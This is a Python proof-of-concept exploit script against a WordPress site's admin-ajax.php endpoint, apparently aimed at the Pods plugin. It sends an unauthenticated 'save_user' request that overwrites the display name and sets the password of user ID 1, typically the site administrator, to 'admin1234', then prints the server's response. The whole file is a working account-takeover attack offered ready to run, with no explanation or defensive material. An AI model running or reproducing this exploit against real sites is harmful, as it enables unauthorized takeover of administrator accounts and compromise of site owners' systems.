import requests
from urllib.parse import urljoin


def main():
    base_url = input("[?] URL_BASE: ").strip().rstrip("/")

    url = urljoin(
        base_url + "/",
        "wp-admin/admin-ajax.php"
    )

    data = {
        "action": "pods_admin",
        "method": "save_user",
        "meta-box-loader": "1",
        "ID": "1",
        "display_name": "POC_CHANGED",
        "user_pass": "admin1234",
    }

    headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 "
            "(KHTML, like Gecko) "
            "Chrome/145.0.0.0 Safari/537.36"
        ),
    }

    print(f"\n[+] Target: {url}")
    print("[+] Sending request...")

    try:
        r = requests.post(
            url,
            data=data,
            headers=headers,
            timeout=15,
            allow_redirects=False,
        )

        print(f"[+] HTTP {r.status_code}")
        print(f"[+] Content-Type: {r.headers.get('Content-Type')}")
        print("\n[+] Response:")
        print(r.text)

    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")


if __name__ == "__main__":
    main()